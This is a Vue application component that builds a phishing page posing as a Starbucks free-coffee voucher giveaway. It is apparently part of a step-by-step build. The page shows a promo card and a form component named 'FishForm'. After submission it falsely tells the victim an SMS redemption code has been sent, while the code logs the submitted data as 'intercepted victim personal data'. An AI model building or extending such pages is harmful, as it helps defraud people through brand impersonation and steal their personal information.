<template>
  <div class="app-container">
    <Header />

    <main class="content">
      <template v-if="!isSubmitted">
        <PromoCard />
        <FishForm @submit-success="handleSuccess" />
      </template>

      <div v-else class="success-page">
        <h2>🎉 恭喜獲得星巴克免費咖啡兌換券！</h2>
        <p>領取簡訊驗證碼已發送至您的手機，請注意查收。</p>
      </div>
    </main>

    <Footer />
  </div>
</template>

<script setup>
import { ref } from 'vue'
// 💡 引入我們等一下要建立的 4 個自訂元件
import Header from './components/Header.vue'
import PromoCard from './components/PromoCard.vue'
import FishForm from './components/FishForm.vue'
import Footer from './components/Footer.vue'

// 控制表單是否送出的狀態
const isSubmitted = ref(false)

// 處理表單送出後的邏輯
const handleSuccess = (formData) => {
  console.log('【系統通知】成功攔截受害者個資：', formData)
  isSubmitted.value = true
}
</script>

<style scoped>
.app-container {
  font-family: 'Helvetica Neue', Arial, sans-serif;
  display: flex;
  flex-direction: column;
  min-height: 100vh;
  background-color: #f7f7f7;
  margin: 0;
}
.content {
  flex: 1;
  max-width: 500px;
  width: 100%;
  margin: 20px auto;
  padding: 0 15px;
  box-sizing: border-box;
}
.success-page {
  text-align: center;
  background: white;
  padding: 40px 20px;
  border-radius: 8px;
  box-shadow: 0 4px 10px rgba(0,0,0,0.08);
  color: #006241;
}
</style>